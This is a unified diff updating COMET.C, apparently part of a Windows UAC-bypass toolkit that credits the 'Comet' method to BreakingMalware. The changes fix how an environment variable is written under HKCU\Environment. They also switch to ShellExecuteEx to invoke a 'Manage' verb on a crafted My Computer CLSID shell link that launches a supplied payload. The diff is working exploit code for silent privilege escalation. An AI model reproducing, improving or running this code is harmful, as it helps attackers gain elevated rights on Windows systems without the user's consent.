@@ -4,9 +4,9 @@
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     2.53
+*  VERSION:     2.70
 *
-*  DATE:        18 Jan 2017
+*  DATE:        25 Mar 2017
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -34,16 +34,17 @@ BOOL ucmSetEnvVariable(
     _In_ BOOL fRemove,
     _In_ LPWSTR lpVariableName,
     _In_opt_ LPWSTR lpVariableData
-    )
+)
 {
     BOOL	bResult = FALSE, bCond = FALSE;
     HKEY    hKey = NULL;
+    DWORD   cbData;
 
     do {
         if (lpVariableName == NULL)
             break;
 
-        if ((lpVariableData == NULL) && (fRemove != TRUE))
+        if ((lpVariableData == NULL) && (fRemove == FALSE))
             break;
 
         if (RegOpenKey(HKEY_CURRENT_USER, L"Environment", &hKey) != ERROR_SUCCESS)
@@ -53,8 +54,9 @@ BOOL ucmSetEnvVariable(
             RegDeleteValue(hKey, lpVariableName);
         }
         else {
-            if (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ, (BYTE*)lpVariableData,
-                (DWORD)(_strlen(lpVariableData) * sizeof(WCHAR))) != ERROR_SUCCESS)
+            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
+            if (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ, 
+                (BYTE*)lpVariableData, cbData) != ERROR_SUCCESS)
             {
                 break;
             }
@@ -81,7 +83,7 @@ BOOL ucmSetEnvVariable(
 */
 BOOL ucmCometMethod(
     _In_ LPWSTR lpszPayload
-    )
+)
 {
 #ifndef _WIN64
     PVOID   OldValue = NULL;
@@ -93,7 +95,8 @@ BOOL ucmCometMethod(
 
     IPersistFile    *persistFile = NULL;
     IShellLink      *newLink = NULL;
-
+    
+    SHELLEXECUTEINFO  shinfo;
 
     if (lpszPayload == NULL)
         return FALSE;
@@ -174,8 +177,18 @@ BOOL ucmCometMethod(
                         _strcpy(szLinkFile, szCombinedPath);
                         _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
 
-                        ShellExecute(NULL, L"Manage", szLinkFile, L"", szCombinedPath, SW_SHOW);
-                        bResult = TRUE;
+                        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+                        shinfo.cbSize = sizeof(shinfo);
+                        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                        shinfo.lpFile = szLinkFile;
+                        shinfo.lpParameters = L"";
+                        shinfo.lpVerb = MANAGE_VERB;
+                        shinfo.lpDirectory = szCombinedPath;
+                        shinfo.nShow = SW_SHOW;
+                        if (ShellExecuteEx(&shinfo)) {
+                            CloseHandle(shinfo.hProcess);
+                            bResult = TRUE;
+                        }
                     }
                 }
                 newLink->lpVtbl->Release(newLink);
